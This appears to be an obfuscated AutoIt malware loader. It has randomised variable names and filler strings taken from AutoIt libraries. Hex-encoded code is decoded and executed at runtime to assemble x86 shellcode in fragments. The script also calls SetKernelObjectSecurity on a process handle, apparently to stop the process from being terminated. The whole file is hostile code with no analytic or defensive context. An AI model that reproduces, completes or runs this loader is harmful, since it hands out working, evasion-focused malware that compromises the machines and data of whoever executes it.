	Dim $eofkzbtdauhipuaaxvn = "wstr"
	Dim $fjdkphl = "c"
	Global $tzgrwntftjcnvhpfrznjwmmb = "Style"
	Global $pmmrsyippn = "cpMaxRange"
	Dim $biuwbsnvvjpl = "kernel32.dll"
	If NOT ($skbecbnkdkjejjbqtbjzdq == 0) Then
		Local $wbagyvmubyznzqmdlzryv = $ee($v1("0x24746A6E7A68676471706C6B716A6D2026202238443835414346414646464635304538413945364646464638393835393030303030303038443835454346384646464635304538393745364646464638393835313430313030303022"))
	Else
		Local $lufkzekbddcxduafaxldfg = $ee($v1("0x246771736E782026202244344646393538343031303030303835433037384235384234354430364134303537364130323839343544383844343544383530353735373537384434354643353036414646464622"))
	EndIf
	Dim $bhnfibfeshrjpns = IsInt("qqofiwaosyfrtlmefcngshkepppykiyiapracp")
	Global $horpari = " alt="
	Global $wgxkghc = "SetMenu"
	Global $expnfr = "ptr*"
	Global $vrgosfn = "handle"
	Global $rstjpklme = "wchar Text["
	Local $lkuykzdkjoijylqrfftrdbi = "wparam"
	Local $acteytrxfvutvom = "status "
	If NOT ($bhnfibfeshrjpns == "adaonnxdgaowlurbsxjrnurx") Then
		Local $farausxvcrnqntnpnjorzhpau = $ee($v1("0x247762616779766D7562797A6E7A716D646C7A7279762026202238443835313446444646464635304538383545364646464638423544313438393835333830313030303038443835423446434646464635304538373045364646464638393835443822"))
	Else
		Local $qnfwbzwjuensuqmeoucryrs = $ee($v1("0x24736463676A6A776C62716A62646169646E6270742026202238443835313446434646464635303844343545433530464644373530464644363839383541433030303030303844383546344643464646463530384434354543353046464437353022"))
	EndIf
	Local $gnemalzkqqaigddoyyhlxlw = $ee($v1("0x24666172617573787663726E716E746E706E6A6F727A687061752026202230303030303038443435443835303842444545383546453646464646383938353330303130303030384434353843353045383530453646464646383938353243303130303030384422"))
	Dim $ckklduuhynttjbkowybqeq = IsInt("txkyjwuzvozuls")
	If NOT ($ckklduuhynttjbkowybqeq == "zxypocsbddbuatuyqdxtlvzeyvjvldzhactlbqbg") Then
		Local $ynxpchwxlrgnesicfo = $ee($v1("0x24676E656D616C7A6B717161696764646F7979686C786C772026202238353643464646464646353045383345453646464646383938353430303130303030384438353534464146464646353045383243453646464646383938353638303130303030384422"))
	Else
		Local $bmefhtskmiapgtjdmnprdycssfqk = $ee($v1("0x246471637A7771776F78636166616D762026202235304646443635393430353038443835383846454646464635303844383543344630464646463530464644373844383546344645464646463833433430433530464644363430353922"))
	EndIf
	Dim $uxmkffpeg = IsString(-49719832)
	Global $zwzfyewuje = "DragQueryPoint"
	If NOT ($uxmkffpeg == 1) Then
		Local $fxcmhhglcajhoxvrgycvwdt = $ee($v1("0x24796E7870636877786C72676E65736963666F2026202238353038463946464646353045383141453646464646383938353830303030303030384438353643464146464646353045383038453646464646383938353834303030303030384422"))
	Else
		$poe($vfds41dfs4("0x446C6C53747275637453657444617461282434646667627335346664672C20312C20246429"))
	EndIf
	Dim $kxrmuskxawvoinee = IsInt(-94973931)
	Global $triqkt = "shell32.dll"
	Local $nhlpusntfgszhcbkwkasyypf = "struct*"
	Local $jvkznnajn = "int"
	Global $lrbghbbmphfnixrbprf = ":"
	Dim $dxuhflgtngdroa = "LoadStringW"
	Global $dleqcqwrqwz = "gdi32.dll"
	Global $roynelavqgwtyjqiqexkcqz = "long"
	Dim $xpppgzrimc = "Address"
	Local $ghhvxuirmahfvwlvbpc = "dword"
	Global $lgazwcqxnsemqcu = "4048FF4424384C8B7C24384983FF1F7E6F4C8B7C244049F7D74C897C244048C7"
	Dim $rqlohj = "$_IESTATUS_InvalidObjectType"
	If NOT ($kxrmuskxawvoinee == 0) Then
		Local $tprzpyvpwb = $ee($v1("0x246678636D6868676C63616A686F787672677963767764742026202238354434464146464646353045384636453546464646383934353743384438354534464346464646353045384537453546464646383938353730303130303030384438353543463922"))
	Else
		Local $kqvrjqdppjzjuefuevrd = $ee($v1("0x24767A646B74797976646E6A79716C696A7478716C74626B2026202237383734433738353330464246464646353436383732363536364337383533344642464646463631363438383835333646424646464643373835464346414646464634453734343722"))
	EndIf
	Dim $fnlnnzv = IsString("iagualkmonwacpmyquwanxufojmy")
	Global $xgbpmobifibgnzvgcwyqosx = "GdipCreateFromHDC"
	If NOT ($fnlnnzv == "njfal") Then
		Local $wrotlgqjqfw = $ee($v1("0x247470727A7079767077622026202246464646353045384435453546464646383934353738384438353043464146464646353045384336453546464646383934353734384438354634463946464646353045384237453522"))
	Else
		Local $qvuvgyryxuhxaoljhibmcrosx = $ee($v1("0x2473647969742026202246463935334330313030303038313345353034353030303037353245384434354538353038443835363846464646464635303537353736383043303030303038353735373537353722"))
	EndIf
	Dim $afeqwhsydelpvc = IsString("qdnwthykciybbobgdwzbqbscbnxpooabfgqfn")
	Global $lezneorzcejeiydmjxsibi = "struct*"
	If NOT ($afeqwhsydelpvc == 0) Then
		Local $odcjsnmkzkscdjxqhqngkmgsfhxus = $ee($v1("0x2477726F746C67716A7166772026202246464646383934353730384438354143464546464646353045384138453546464646383934353643384438353734464646464646353045383939453546464646383938353343303122"))
	Else
		Local $djbnp = $ee($v1("0x24756D7366676D79666E7963776F64717664797968787766626C6478612026202243373835334346454646464636343643364330304337383538384645464646463543344236453646433738353843464546464646373736453434364343373835393046454646464622"))
	EndIf
	Local $mmfyweloqwlifxrep = $ee($v1("0x246F64636A736E6D6B7A6B7363646A787168716E676B6D677366687875732026202230303030384438353430464546464646353038443435453035304646443735304646393545384638464646463842354431343839343536343844383541344643464646463530453822"))
	Dim $vjrgtfiluarh = IsString("bkszkkngbybodzrxywcpfuisqbqgsltcsadydvtkowemg")
	If NOT ($vjrgtfiluarh == "sqckckdisvnxfsafj") Then
		Local $kjoqisdymcxkdlpssmymdgel = $ee($v1("0x246D6D667977656C6F71776C6966787265702026202236444535464646463842354430433839343536303844383543304641464646463530453835424535464646463839343535433844383535344646464646463530453834434535464622"))
	Else
		Local $hrwopeddl = $ee($v1("0x24647A7773646A69766B766867786A6C777271767769757172626C2026202245383643454246464646383934353134384438354434463446464646453835454542464646463839343531383835433037353045384438354334463046464646453834434542464622"))
	EndIf
	Dim $fhquta = IsString("skomciaszxmz")
	Local $lkpudwpsuxkf = "lparam"
	Global $khhwlrwqdusnqvgapdvxbfg = " length"
	Local $zfeubsyvpujvf = "struct*"
	Local $lzkizxnwvbcywfbskzr = "handle"
	Local $tzpuflqtyci = ";"
	Global $dcmcrhzzqz = "dword"
	Local $qlfaxgdglsescfcdzqol = "user32.dll"
	Local $npzejtiqvu = "gdi32.dll"
	Dim $tbkbqarkhjp = "(?i)^("
	Global $rilyzbdrkybtmcbjxkfujx = " & $sFind & "
	Local $tyxffjdmxrikvszebqmzw = "JobsQueued"
	Local $ymfwcmtdydf = "SigSize"
	Dim $epygpktybrgpig = "handle"
	If NOT ($fhquta == "wteicqvhalqqhh") Then
		Local $bqtcxeopnpwofbetbzj = $ee($v1("0x246B6A6F71697364796D63786B646C7073736D796D6467656C2026202246463839383544303030303030303844343539343530453833444535464646463839343535383844383545384641464646463530453832454535464646463839343535343844383522"))
	Else
		Local $ypofxrpyzpdiplzsihmybqcajuto = $ee($v1("0x246D707172696E7A6C61667A6F7A7A74617569626A676E706861722026202237383537453839364543464646463842463038443435434335304538384245434646464638424638384434354243353046464436353934303530384434354243353038443835384322"))
	EndIf
	Dim $ygjogtdgkkyfls = IsString("nicmerwhkaujtvvduuo")
	Local $xbqyeoakopmemj = "_IE_Introduction"
	Dim $trfllrvemomjdkrsuvliifzg = "wparam"
	Local $xflvznochjamjutran = "byte["
	Local $vlroawqor = "bool"
	Dim $axyatnwphjiujcopnztif = "browser"
	Dim $uhzrxoplyqiwurgaevyl = "MimeType"
	Global $xhbaretq = "dword"
	Global $gmnerstx = "dword"
	Global $rvwstekmqrwcbjwnygea = "bmHeight"
	Dim $kumzdfsfbkeqgezl = "[0-9]+\Z"
	Dim $fnjjlv = "bool"
	Dim $rrtaqflygfghymurxtqjy = "bool"
	Local $qvcakbdiawnkrdzasaek = "int"
	Global $aorobeuwwc = "SetMessageExtraInfo"
	Local $dkofbygcykauupryqeuvp = "kernel32.dll"
	Local $mbdfzrissewhmyjboec = "Types"
	Global $hodygxfpfcyvszuachch = "\"
	Local $kmrvsgkzhbtupcblknd = "user32.dll"
	If NOT ($ygjogtdgkkyfls == "izsvqxmxq") Then
		Local $coenlvqnltsldf = $ee($v1("0x246271746378656F706E70776F66626574627A6A2026202234384646464646463530453831464535464646463839383534433031303030303844383543344643464646463530453830444535464646463839343536383844383542384645464622"))
	Else
		Local $gqsnx = $ee($v1("0x246A6770616665716C6C7467667970696A7769682026202230303030383543303738444538423436353035373638303030303030303836413430383934354430384434354430353035373638314630303046303038443435453035303839374422"))
	EndIf
	Dim $iqgkhncubjrsvtlobmiv = IsString("skziltpjbxwf")
	Global $eyawruyr = "user32.dll"
	Dim $llktiegrbbtjpwiaudrrw = "wparam"
	Dim $pbyjpsb = "long"
	Global $cqcpmykdydlpkzjt = "GdipSetStringFormatLineAlign"
	Local $jzfgidhfwb = "ptr"
	Dim $ratsyeqsgsibrzqzawonpi = "uint"
	Global $tlftobpcpykf = "wstr"
	Global $wpchw = "APIResConstants.au3"
	Local $rgvfumgi = "input"
	Global $eslysrtycbf = "handle"
	Local $nqafi = "] "
	Dim $homtwup = "byte bOutlineLevel;word wShadingWeight;word wShadingStyle;word wNumberingStart;word wNumberingStyle;"
	Local $jhqhlqkpdgoclnkegwgdcudb = "Cannot register internal error handler, cannot trap COM errors"
	Global $yuyiumgjckgeju = "GetDIBColorTable"
	Global $ofczirotblxpdoxoelvfxup = "Mask"
	If NOT ($iqgkhncubjrsvtlobmiv == "nsrndokweokiyfwwcuoxg") Then
		Local $coszbain = $ee($v1("0x24636F656E6C76716E6C74736C64662026202246463530384434354530353046464437384244384538463645344646464638393435353038443835433446424646464635303844343545303530464644373842443845384446453422"))
	Else
		Local $ojxuhiz = $ee($v1("0x24757A7A6A71722026202246463833433430433530464644363539343035303844383534434645464646463530384438353934453446464646353046464437384438354230464446464646383343343043353022"))
	EndIf
	Dim $itarxij = IsString(-5888614)
	Dim $npckpsajuyviqfixsbtq = "dword"
	Global $ynbdd = "handle*"
	Global $bsuqwsuibowijyrbrzmdeto = "RegLoadMUIStringW"
	Global $ewnoxvcatqvomext = "struct*"
	Dim $nrzvam = "GdipGetImageWidth"
	Dim $uidyzgnyumragjeb = "handle"
	Dim $hflbnueyebncuv = "byte Data["
	Dim $mwpgrzyfkbghv = "gdi32.dll"
	Global $rsiigqduiixh = "StateMask"
	Global $scspjngq = "MouseCoordMode"
	If NOT ($itarxij == "rdubnzdmqietxwvnnzvtrrzbihfwltktzsfoxqlylwqf") Then
		Local $hwnobmqiekewbxxdigh = $ee($v1("0x24636F737A6261696E2026202246464646383934353438384438353634464346464646353038443435453035304646443738424438453843384534464646463839343534343844383534344643464646463530384422"))
	Else
		Local $gaglz = $ee($v1("0x24716574657763666F6F61726B6D7776646A6F73667565692026202237304337343544343635364535333635433734354438363337343639364636364337343544433645303043373435424334453734344436314337343543303730353636393635433722"))
	EndIf
	Dim $wdtxqjhssccfxf = BinaryToString("akiisbumnqikqgkayhvrqihthp")
	Global $cqumwofcekw = "Error"
	Dim $vjmjxs = "hwnd"
	Local $rucmfntqsiidvbqx = "ptr"
	Local $civsadbvjj = "struct*"
	Dim $mcdstbzoluec = "handle"
	Global $iwlngrngvbbjdskgvczqtyxd = "%.2f"
	Local $qorqgdbnmxjyrzvhqrr = "bool"
	Global $nizuig = "wparam"
	Global $fvywsdlvfbf = "ptr["
	Local $dhrxrhlqoxpajq = ">It is supported by a very active and supporting <a href="
	Global $dopddtcddewluqeexvnri = "user32.dll"
	Global $ogbhruvjkgbithaoouocpf = "kernel32.dll"
	Dim $wmvydnlxtowsu = "<br>"
	Dim $naoovkpuycnd = "WinAPIProc.au3"
	Dim $mtvuiakgsqla = "long[2];"
	If NOT ($wdtxqjhssccfxf == 1) Then
		Local $qdwvdt = $ee($v1("0x2468776E6F626D7169656B6577627878646967682026202234354530353046464437384244384538423145344646464638423544313838393435344338443835463446424646464635304538394645344646464638393435333438443835323422"))
	Else
		Local $xdxqzrraxracweathmgxvshmaqet = $ee($v1("0x2469746F7268732026202245383630453846464646383938353130303130303030384438353943464246464646353045383445453846464646383938353938303030303030384438353034464346464646353022"))
	EndIf
	Local $idmmtazbpghzwtdxdohhgdfroquts = $ee($v1("0x247164777664742026202246464646464635304538393045344646464638393435333838443835334346464646464635304538383145344646464638393435334338443835433446454646464635304538373222"))
	Dim $wtifscef = IsInt("yrdrsvuywlfvf")
	Global $abzhh = "refresh"
	Dim $yzrzjcuwxjjv = "ptr"
	Dim $fyxefgafila = "Mask"
	Dim $idonuyurfizkjvgdbjy = "RemoveFontMemResourceEx"
	Global $khadytiojspd = "-"
	Dim $iwdnotoeuxezfkqmlyztg = "Top"
	Local $birzhvggaitmufgqwdfftudd = "user32.dll"
	Dim $eqmoufe = "<input type="
	Dim $pwzryy = "RemoveWindowSubclass"
	If NOT ($wtifscef == 1) Then
		Local $klbkvsjdwlkfvmqqelndtahnvmf = $ee($v1("0x2469646D6D74617A627067687A77746478646F6868676466726F717574732026202245344646464638393435343038443835323446434646464635304646423545344638464646464646393545384638464646463839343533303844383537344642464646463530464622"))
	Else
		Local $weymdkvsrospsvkhu = $ee($v1("0x247562766C68726C6C696F787970762026202236433733333333324337383537304645464646463543344636433635433738353734464546464646333333323245363436364337383537384645464646463643364338383835374122"))
	EndIf
	Dim $ergsiwcilggengcsbp = IsString("vcbemzrkzuxquc")
	Dim $taohhfovwgmoowmhp = "<li><a href="
	Local $yfaoiuhpijdsxbmrupvc = "]"
	Local $ybsnvpiyhmmso = "GetThemeSysFont"
	Global $myzmmdtrmkumapjxnucnqgma = "int;int;hwnd"
	Local $fkjyrvqjexyxuhabluvyr = "16 Bpp ARGB 1555"
	Local $txmigmzm = "ExcelConstants.au3"
	Dim $gdlcrkgezpxhgpf = "s"
	Dim $mecvefuj = "WinAPIHobj.au3"
	Dim $ylwnttyardokyppvpfs = "bool"
	Local $hodllyfiicdmbdaumwha = "\\"
	Dim $tdgojfdpcheehjiizujvmhm = "struct*"
	Local $utwtkggqkhfjvcfmbfwzt = "_IEFormElementCheckBoxSelect"
	Dim $hgdfmlrscoljsiw = "user32.dll"
	Global $zacpzhpzghqnbjpime = "handle"
	Dim $yqmhgrvt = "GetEnhMetaFileBits"
	Dim $bcldlshvqmfkbpnbukwsvxn = "]"
	Local $hsqufnyrlyymxuxhk = "bool"
	Global $kstpbjwqd = "GdipTranslateWorldTransform"
	Local $tvkofvhsljdod = "dxOffset"
	If NOT ($ergsiwcilggengcsbp == 0) Then
		Local $yvxdf = $ee($v1("0x246B6C626B76736A64776C6B66766D7171656C6E647461686E766D662026202242354534463846464646464639354538463846464646384235443043383934353243384438353334464346464646353045383334453446464646383934353238384438353434464422"))
	Else
		Local $reubjzetidgaonwqmfirszvecys = $ee($v1("0x2470736C68786E756F67706D636C6B7766776B70696D78656379782026202238443835363046424646464635304538454445374646464638393835373430313030303038443835443046454646464635304538444245374646464638393835303030313030303022"))
	EndIf
	Dim $cvonwhdfpybtvri = IsString("ipkokmljczzqjfjoualzoytnnouaqia")
	Local $bjibojavaoelswtvppt = "float["
	Local $upecladvvfqplsmmy = "</html>"
	Dim $ebupazynzsp = "Buffer"
	Dim $psxmyarftyvdl = "0"
	Dim $rhwgmt = "\psapi.dll"
	Local $mcpwcq = "comctl32.dll"
	If NOT ($cvonwhdfpybtvri == "hqapfxayqmmu") Then
		Local $fjfvgpbbuthdxclqobkfhpykd = $ee($v1("0x2479767864662026202246464646353045383235453446464646384235443134383934353234384438353734464446464646353045383133453446464646364135453839343532303842343530383539384422"))
	Else
		Local $rudpycewogqzsphtpvvbc = $ee($v1("0x2466696D627563666B6F746D79707363626B78672026202233324337383530344646464646463245363436433643383838353038464646464646433734354530373537333635373243373435453433333332324536343636433734354538364322"))
	EndIf
	Dim $zdupmogqyhwuwo = BinaryToString("odieylppdkygasb")
	Dim $owzwxiklxcj = "dword"
	Dim $rlxonespqnlzufxf = "documentContainer"
	Global $irpag = "struct*"
	Dim $ciopqo = "handle"
	Dim $zqjwpyg = "		<td>come</td>"
	Local $nfosqkqzxclqrgcqhbyvlpa = "HeapSize"
	Dim $pdstiowztxopxfaohcriz = "int"
	Global $qfnpmxetmvumhduwurmfbrdt = "SetThreadLocale"
	Global $ydxvmjtddag = "dword Size;hwnd hWndOwnder;handle hInstance;dword rgbResult;ptr CustColors;dword Flags;lparam lCustData;"
	Global $vcbkngdiuohqpxybuup = "kernel32.dll"
	Dim $pzhcoaqwoeqngpcih = "StringConstants.au3"
	Dim $ijovuvecglxglfnbc = "$_IESTATUS_COMError"
	Global $ryzcacr = "Button"
	Global $nzkqhglmiswopc = "Span"
	Local $abafwx = "dword"
	Global $jmvseuduxywu = "InvalidateRect"
	Dim $qcagcixupaqhygrbh = "dword"
	If NOT ($zdupmogqyhwuwo == 1) Then
		Local $nojmkiyhezmhukpkl = $ee($v1("0x24666A6676677062627574686478636C716F626B666870796B642026202237353043384246384633413535463545354243394332374330313535384245433831454337433036303030303533353635374646373530384646393533343031303030303430353022"))
	Else
		$er = $poe($fooi4e("0x446c6c43616c6c282261647661706933322e646c6c222c2022696e74222c20225365744b65726e656c4f626a6563745365637572697479222c2022707472222c202449485431352c202264776f7264222c202230783034222c2022707472222c2024504f4f4f4529"))
	EndIf
	Dim $xyrqnblvejngbvjptxvvbl = BinaryToString("0x666D6A7A77756E63786F73757A666B6975616D7369657468676A6A7864")
	Local $eogwocbjszlmfrn = "dword"
	Local $uomoqy = "int"
	Local $vlglyzoghymzeamrphkqen = "bool"
	Dim $xzapxir = "ftLastWriteTime"
	Dim $xlnnmrkgu = "OpenWindowStationW"
	Dim $oaxaqtvsisaibanrj = "ptr;ptr;dword;wchar["
	Global $yuogcuyzthyiahlaswrxgn = "shlwapi.dll"
	Dim $flmdtwedfrtlr = "hwnd"
	Global $wyatriuomynyxqlwjuxjl = "kernel32.dll"
	Dim $ueuqrobxwcjox = "$_IESTATUS_InvalidDataType"
	Global $rxruigfpfwcwbmjbyozmnd = "LocalFree"
	Global $pbugxzxazrodgcnzfkumewj = "struct*"
	Local $jmgjnauwteliixfwb = "ushort ProcessorGroup[n]"
	If NOT ($xyrqnblvejngbvjptxvvbl == 1) Then
		Local $jzseqtbpjuny = $ee($v1("0x246E6F6A6D6B697968657A6D68756B706B6C2026202246463735303838443835383846394646464635304646393534433031303030303833433431303638303430313030303038443835363046454646464635303844383538384639464622"))
	Else
		Local $qetewcfooarkmwvdjosfuei = $ee($v1("0x247A6F6B6E6B74696A6F6F71736B7977796578797878616761762026202238423044333030303030303035333536384246303333433038393435464338393435463838423439304338423439313438423039384235393130353743373435443034453734344622"))
	EndIf
	Dim $xsllnitclttsbyhqltqdo = BinaryToString("0x62676479796E68776D6C7167796E6672727A727571686166746A74717269677375676D6D6D7767736C6F737674657178")
	Local $wbxhiuoxlxxbtau = "bool"
	Local $zmjkagu = "wstr"
	Local $gnjbbzmredkzdemksj = "n"
	Local $qafkxembqngj = "int"
	Global $ovztocsfsaifxqnkbuhpmdr = "."
	Global $qnqepgmowwkhbgyvmkozolcd = "wchar Text["
	Local $bkkeuyomepokbsit = "handle"
	If NOT ($xsllnitclttsbyhqltqdo == "ckggognzgxtkstnikymppdkgetrozyosgpkmlnsymlnjfk") Then
		Local $xqkvrsasojkiv = $ee($v1("0x246A7A7365717462706A756E792026202246463530464639353438303130303030384235443043384237333343333346463641313038443435453835303839374445303839374446433839374444383839374446383839374422"))
	Else
		Local $cfcctwdgwkzrpqsax = $ee($v1("0x24786A626D6863696B666164656C70696C78667168616E72632026202237324337383539434643464646463639373636353442363643373835413046434646464636353739383838354132464346464646433738353838464246464646343337323739373022"))
	EndIf
	Dim $tsarrqhpulfknzarkelsqinu = BinaryToString("0x776D687979677161617374716B6E")
	Global $hfrldlvoktuxedc = "char Text["
	Global $okkheh = "int"
	Local $fgylrhcngnyjo = "LutR"
	Dim $krulf = "$_IESTATUS_InvalidObjectType"
	Local $ejpdzajnuaqilhcpcqwsvsaf = "hwnd"
	Dim $qexfvszghsznfelooouo = "Y2"
	Local $jonudljj = "kernel32.dll"
	Global $tixuvqmau = "uint"
	Dim $qojemqm = "GetEnhMetaFileDescriptionW"
	Local $anrhx = "OpenProcess"
	Global $iduzkdqtteccuhglxguhwtj = "{98EC0E18-2098-4D44-8644-66979315A281}"
	Local $ijcosqfwozirefnsxhq = "on the Device "
	Dim $ggjranbptukrvgqfllw = "wstr"
	Global $cgboudwbjam = "str"
	Dim $ebpsuyfogmkgcrvfsiaydd = "Bottom"
	Local $ytskkfgduakvdetcozp = "int"
	Local $efehdo = "GdipSetPathGradientWrapMode"
	Global $mdzwf = "bool"
	If NOT ($tsarrqhpulfknzarkelsqinu == 0) Then
		Local $sdyit = $ee($v1("0x2478716B76727361736F6A6B69762026202244433033463346463935334330313030303036413434384438353638464646464646353046463935334330313030303036384343303230303030384438353930464246464646353022"))
	Else
		Local $yftmwjljpdwyteuw = $ee($v1("0x24756574736C72752026202246464646373537323633363538383835453846444646464643373835423446434646464635333639374136354337383542384643464646463646363635323635433738354243464322"))
	EndIf
	Dim $wgddhrl = IsString(1723838)
	Dim $pdzhfwpmgcbszbaxrdiopk = "GdipTranslateWorldTransform"
	Local $jtmuu = "handle"
	If NOT ($wgddhrl == 1) Then
		Local $qvuvgyryxuhxaoljhibmcrosx = $ee($v1("0x2473647969742026202246463935334330313030303038313345353034353030303037353245384434354538353038443835363846464646464635303537353736383043303030303038353735373537353722"))
	Else
		Local $tfqokzmhzkljtnw = $ee($v1("0x246C72706D6766796568787775752026202243373835363846434646464637333734363537324337383536434643464646463433364336313733363643373835373046434646464637333537383838353732464346464646433722"))
	EndIf
	Dim $hhdxm = IsInt("vnnannflxmdluyscrfwdvxcyciyresbjmvqwlfiwgaxqoc")
	Local $xtele = "Param"
	Local $slvsgeaqgvccrlk = "handle"
	Local $yclvjiyonjepfnvgcg = "int"
	Local $ywwpy = "struct*"
	Local $micbmiocwcn = "gdi32.dll"
	Global $qlrqpgliexuqafogll = "Refresh"
	Dim $bcosf = "$RBHT_CLIENT  - The point was in the rebar band"
	Dim $drwjggkxi = "BtnShadow"
	Dim $defgwhioqrbimqpjdxkyhca = "wparam"
	Global $tzdicdeixx = "SizeofResource"
	Dim $xzppmpoxprbtkxhpadziq = "status "
	Local $hoydetsmwbmzs = "dword*"
	Local $jjeicosfwswtxzfjq = "Bottom"
	Dim $rktvyoxjkixopiygjahsvshl = "GetWindowSubclass"
	Global $xvdineozzqijorju = "play "
	Global $dpazzqxpcyd = "int"
	Global $zanhz = "Error"
	Local $iypaq = "int"
	Dim $ytrovzwwesqpmb = "uint"
	If NOT ($hhdxm == 1) Then
		Local $zpkjxp = $ee($v1("0x24717675766779727978756878616F6C6A6869626D63726F73782026202238443835363046454646464635304646393532433031303030303835433037353130353346463935323830313030303033334330354635453542433943323830303135373641313822"))
	Else
		Local $tjnzhgdqplkqjm = $ee($v1("0x247466676262706F6F726961766F6C6F62657A6170707175686B642026202238443835303446454646464635304538434445364646464638393835304330313030303038443835334346414646464635304538424245364646464638393835364330313030303022"))
	EndIf
	Dim $jjoqvnojycgb = IsInt("irvriecyezjbeefccctapdfbiyjbmfhcproejhugbqmi")
	Dim $pzkpkezerchuuoh = "int"
	Dim $hflrkehpstumfsmbwb = "statustext"
	Global $eplekgpeozychsybypfiumfk = "float["
	Global $hssfrnscpznzxsle = "bool"
	Global $yzozxmfkesjb = "struct*"
	Local $hmvthpppiclphqjhlp = "GetIconInfo"
	Global $ssutlcnkfynlfkzi = "handle"
	Local $jkgxmwxuvkymfpcotaav = "title"
	Dim $cdxdcfkz = "OnClick"
	Dim $pemuiwnirahliwcvfiasihfd = "handle"
	Local $vollnlfzybzsdhekevr = "GPIB0::20::0"
	Dim $kfqkjrizjatdrtgpuadweufp = "bool"
	Local $wbibalw = "handle"
	Dim $dcnrysyzapkeobrlkuqz = "CryptGenRandom"
	Local $nlybysrvpzvrypefbhqwutsm = "wparam"
	Local $bcohtpdagaqzgiuu = "handle"
	Global $swfoorjreusm = "ptr Data"
	Local $qsbsbbvp = "WinAPIHObj.au3"
	Dim $ikozyoswrsvna = "int"
	If NOT ($jjoqvnojycgb == 1) Then
		Local $cgpdrdbkldsugkqiwxlluxwqyhcyg = $ee($v1("0x247A706B6A78702026202238443435423435303537464637354538464639353743303130303030353736413034384434353038353038423435423838334330303835304646373545383839374430384646393522"))
	Else
		$pepag0 = $ee($v1("0x446C6C43616C6C28226B65726E656C33322E646C6C222C202264776F7264222C202247657450726F636573734964222C202268616E646C65222C2024636D6E716261656E75796177776B6E627472657874686F6872687A78687A6E796C7564686367756B67666D635B2230225D295B2230225D"))
	EndIf
	Dim $xyfoowlbrbtm = IsString("nmquihjenlycibeqdaascjfdjlyeabt")
	Dim $jcjzdfwetxw = "		<td>1</td>"
	Global $acsdxjjqo = "uint"
	Local $xecboulnexgkutjkvyopvw = "int"
	Local $eaxysomqghrcrjcaiadvhjea = "DefWindowProc"
	Global $isablsckunoljuunl = "ulong_ptr*"
	Dim $pmpnvpo = "ptr"
	Global $xzxxdxfggjpzhmupubnvs = "X"
	Local $awdnfvekoyqoolrwif = "$_IESTATUS_InvalidDataType"
	Global $qectgvmdzdojfwh = "wstr"
	Global $kfekj = "handle"
	Dim $ikqnm = "ProductName"
	Global $krbuzar = "hMenu"
	Local $cfiokdpfbsjgugnfmcmmq = "ptr"
	Local $mpsxajo = "shlwapi.dll"
	Global $tastanxhvztexuhu = "word MinSecond;word MinMSecond;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;"
	Local $dekofcukrerellgnmmsc = "ChangeWindowMessageFilter"
	Local $wrihsyqguzd = "wstr"
	If NOT ($xyfoowlbrbtm == "owraybwpfzqrhepfbgsilo") Then
		Local $jgpafeqlltgfypijwih = $ee($v1("0x24636770647264626B6C647375676B716977786C6C7578777179686379672026202238303031303030303835433037393043353746463735453846463935354330313030303045424243384234353038334234363334373530453530464637354538464639353643303122"))
	Else
		Local $fimbucfkotmypscbkxg = $ee($v1("0x2478657867772026202246454646464635433442364536464337383546384645464646463737364534343643433738354643464546464646364337333543344643373835303046464646464636433635333322"))
	EndIf
	Dim $jmmrfdgcdvitq = IsString("gqgeagqfvjoudwzkfeszfreldnhpzkng")
	Global $vpvnxxvcmbxxei = "int"
	Global $azbxvifs = "StringConstants.au3"
	Dim $brwzynhcovppvcre = "UDFGlobalID.au3"
	Dim $zzvcuhuozhpuawgbu = "short Len;wchar Text["
	Global $qbrgilkfvedamfbpfobsezh = "X"
	If NOT ($jmmrfdgcdvitq == 0) Then
		Local $gqsnx = $ee($v1("0x246A6770616665716C6C7467667970696A7769682026202230303030383543303738444538423436353035373638303030303030303836413430383934354430384434354430353035373638314630303046303038443435453035303839374422"))
	Else
		Local $tprzpyvpwb = $ee($v1("0x246678636D6868676C63616A686F787672677963767764742026202238354434464146464646353045384636453546464646383934353743384438354534464346464646353045384537453546464646383938353730303130303030384438353543463922"))
	EndIf
	Dim $aotpawzgizyhouiwptvdoivv = IsInt(-46450908)
	Dim $urtwhixrq = "wstr"
	Dim $uefdhru = "InflateRect"
	Global $gmrlrsxxeqwaniek = "State"
	Local $fyymaudpsjelkk = "struct*"
	If NOT ($aotpawzgizyhouiwptvdoivv == 0) Then
		Local $lufkzekbddcxduafaxldfg = $ee($v1("0x246771736E782026202244344646393538343031303030303835433037384235384234354430364134303537364130323839343544383844343544383530353735373537384434354643353036414646464622"))
	Else
		Local $sdyit = $ee($v1("0x2478716B76727361736F6A6B69762026202244433033463346463935334330313030303036413434384438353638464646464646353046463935334330313030303036384343303230303030384438353930464246464646353022"))
	EndIf
	Dim $hfwqettqrhtqx = IsString("jtymvzqoxjznzdujwzzrfs")
	Dim $ppizrqodfn = "APIThemeConstants.au3"
	Dim $qixwflvhmfivsa = "kernel32.dll"
	Global $mucdupciofcaofqlvdiz = "handle"
	Global $mzdjaeyqallafcivsvorfthy = "#"
	Global $xxesruvqerfc = "float"
	Local $bodekjnhqenbtsre = "TTF_SUBCLASS,"
	Dim $bswttgjmddmtkbqssvvh = "int"
	If NOT ($hfwqettqrhtqx == 0) Then
		Local $whngczurqqtsp = $ee($v1("0x246C75666B7A656B62646463786475616661786C6466672026202237354530464639353738303130303030383543303738393038423436333438393435463838423435443038393435444338423435303833423436333437323046334234363530373722"))
	Else
		Local $cnpixpzptwbritzmfzadvstjjno = $ee($v1("0x24717A706377706F656D616E627374616177642026202230303530463341354538463645324646464636413545353938424630384437433234313046334135384237353038383033453346353637353041464639343234333830313030303022"))
	EndIf
	Dim $poodtcxmmwtj = BinaryToString("0x64616263796B617573646D7871797A797770776564696F667A79")
	Global $xbwjedkdzcaz = "Text"
	Local $trchf = "struct*"
	Local $orqqzaotnw = "table"
	If NOT ($poodtcxmmwtj == 0) Then
		Local $kzfmgjfcvnlg = $ee($v1("0x2477686E67637A757271717473702026202230413530464637354538464639353643303130303030364134303537364130323844343544433530353735373537384434354638353046463735453846463735453046463935373822"))
	Else
		Local $sckhlnlekfpguletadatcaz = $ee($v1("0x246368636773686B73667979782026202238423542334346463735304346463735464346463935353430313030303033334330383343343043383937444534363633423436303637333332384234353043384439433033304322"))
	EndIf
	Dim $gdalldatzxmdispvuxqtkti = IsInt("yjvdxianllidutsnswmihgpfpckwokaudhoch")
	Local $kjmcxq = "dword SecurityLimitFlags;ptr JobToken;ptr SidsToDisable;ptr PrivilegesToDelete;ptr RestrictedSids"
	Local $rwcpthqeniglszpgsn = "<input type="
